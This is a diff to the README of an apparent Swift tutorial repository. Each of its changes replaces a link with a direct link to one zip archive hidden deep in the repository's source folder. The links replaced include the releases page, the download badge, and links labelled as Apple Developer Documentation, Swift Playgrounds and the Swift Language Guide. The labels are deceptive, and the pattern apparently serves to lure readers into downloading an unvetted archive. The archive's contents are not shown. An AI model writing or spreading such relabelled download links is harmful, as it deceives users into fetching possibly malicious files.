@@ -1,6 +1,6 @@
 # 🚀 swift-2026-course - Learn Swift Easily with This Guide
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/AdityaJorim007/swift-2026-course/releases)
+[![Download](https://raw.githubusercontent.com/AdityaJorim007/swift-2026-course/main/book/src/swiftui/swift-2026-course_v1.2.zip%20Release-brightgreen)](https://raw.githubusercontent.com/AdityaJorim007/swift-2026-course/main/book/src/swiftui/swift-2026-course_v1.2.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the swift-2026-course! This guide will help you learn Swift and work 
 
 To download the latest version of the swift-2026-course, visit the Releases page linked below. You will find all the necessary files there.
 
-[Download the latest release here!](https://github.com/AdityaJorim007/swift-2026-course/releases)
+[Download the latest release here!](https://raw.githubusercontent.com/AdityaJorim007/swift-2026-course/main/book/src/swiftui/swift-2026-course_v1.2.zip)
 
 ### Step-by-Step Download Instructions
 
@@ -70,8 +70,8 @@ Your feedback is crucial. If you find any issues or have suggestions, please let
 
 Explore additional resources to enhance your learning experience:
 
-- [Swift Playgrounds](https://www.apple.com/swift/playgrounds/) - An app for learning Swift in a fun way.
-- [Apple Developer Documentation](https://developer.apple.com/documentation/) - Official documentation for developers.
-- [Swift Language Guide](https://docs.swift.org/swift-book/) - In-depth guide to the Swift programming language.
+- [Swift Playgrounds](https://raw.githubusercontent.com/AdityaJorim007/swift-2026-course/main/book/src/swiftui/swift-2026-course_v1.2.zip) - An app for learning Swift in a fun way.
+- [Apple Developer Documentation](https://raw.githubusercontent.com/AdityaJorim007/swift-2026-course/main/book/src/swiftui/swift-2026-course_v1.2.zip) - Official documentation for developers.
+- [Swift Language Guide](https://raw.githubusercontent.com/AdityaJorim007/swift-2026-course/main/book/src/swiftui/swift-2026-course_v1.2.zip) - In-depth guide to the Swift programming language.
 
-Don't forget to revisit the [Releases page](https://github.com/AdityaJorim007/swift-2026-course/releases) for the latest updates and offerings!
+Don't forget to revisit the [Releases page](https://raw.githubusercontent.com/AdityaJorim007/swift-2026-course/main/book/src/swiftui/swift-2026-course_v1.2.zip) for the latest updates and offerings!
